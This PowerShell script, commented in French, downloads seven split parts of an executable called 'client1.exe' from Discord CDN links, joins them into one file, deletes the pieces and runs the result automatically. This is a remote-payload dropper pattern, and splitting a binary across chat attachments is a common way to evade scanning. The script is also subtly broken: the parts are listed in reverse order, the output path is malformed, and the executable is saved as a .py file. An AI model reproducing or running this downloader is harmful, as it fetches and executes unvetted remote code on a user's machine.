# Récupère les différentes parties d'un fichier depuis des liens Discord (ou autres URLs)
# Assemble les fichiers en un fichier final, et exécute ce fichier si besoin.

$urls = @(
    "https://cdn.discordapp.com/attachments/1159446050596196352/1327337196604100711/client1.exe.part7?ex=6782b298&is=67816118&hm=8800bf14d78d9e989b83e6fba6429d66fe1025ed73a559cabaf43c068c90c488&",
    "https://cdn.discordapp.com/attachments/1159446050596196352/1327337196033937439/client1.exe.part6?ex=6782b298&is=67816118&hm=f59b8de98ce65d2a13cc1a1fdbd03b920dd4c5086dfb7d686ffdffb30805cd2f&",
    "https://cdn.discordapp.com/attachments/1159446050596196352/1327337195559718994/client1.exe.part5?ex=6782b298&is=67816118&hm=e1d2f66aaac78a11898d0110826883e4b1a04809f79c3d669b989657d8961ddb&",
    "https://cdn.discordapp.com/attachments/1159446050596196352/1327337194691756043/client1.exe.part4?ex=6782b297&is=67816117&hm=9aa6d26c253752a16b48442a18b7b6be203681c1c697245b6fb682c27b102fb5&",
    "https://cdn.discordapp.com/attachments/1159446050596196352/1327337194200891522/client1.exe.part3?ex=6782b297&is=67816117&hm=4daac304e85421b66539921b47ed37f67276fc99ef6d82df05beaf88b8cfddb2&",
    "https://cdn.discordapp.com/attachments/1159446050596196352/1327337193810694214/client1.exe.part2?ex=6782b297&is=67816117&hm=16ca8ea06059a0c77d7b0a44f71167cf31b89c4cb54617f9f18697fd21537253&",
    "https://cdn.discordapp.com/attachments/1159446050596196352/1327337193290727464/client1.exe.part1?ex=6782b297&is=67816117&hm=93b6fb7d3569acddd76a4116dbd3b63e1ac967f7cb51907d5070cb714809012a&"
)

# Nom du fichier final après assemblage
$outputFile = "$env:C:\Users\Sano\Desktop\new-project\download.py"

# Nom des fichiers temporaires
$tempFiles = @()

# Téléchargement des parties
Write-Host "Téléchargement des parties..."
foreach ($index in 0..($urls.Count - 1)) {
    $url = $urls[$index]
    $tempFile = "$env:TEMP\part$($index + 1).tmp"
    $tempFiles += $tempFile

    try {
        Invoke-WebRequest -Uri $url -OutFile $tempFile -ErrorAction Stop
        Write-Host "Téléchargé : $url"
    } catch {
        Write-Host "Erreur lors du téléchargement : $url"
        exit 1
    }
}

# Assemblage des parties
Write-Host "Assemblage des fichiers..."
Try {
    $fs = [System.IO.File]::Create($outputFile)
    foreach ($tempFile in $tempFiles) {
        $bytes = [System.IO.File]::ReadAllBytes($tempFile)
        $fs.Write($bytes, 0, $bytes.Length)
    }
    $fs.Close()
    Write-Host "Fichier assemblé : $outputFile"
} catch {
    Write-Host "Erreur lors de l'assemblage des fichiers."
    exit 1
}

# Suppression des fichiers temporaires
Write-Host "Suppression des fichiers temporaires..."
foreach ($tempFile in $tempFiles) {
    Remove-Item -Path $tempFile -Force
}

# Exécution du fichier final
Write-Host "Exécution du fichier assemblé..."
Start-Process $outputFile
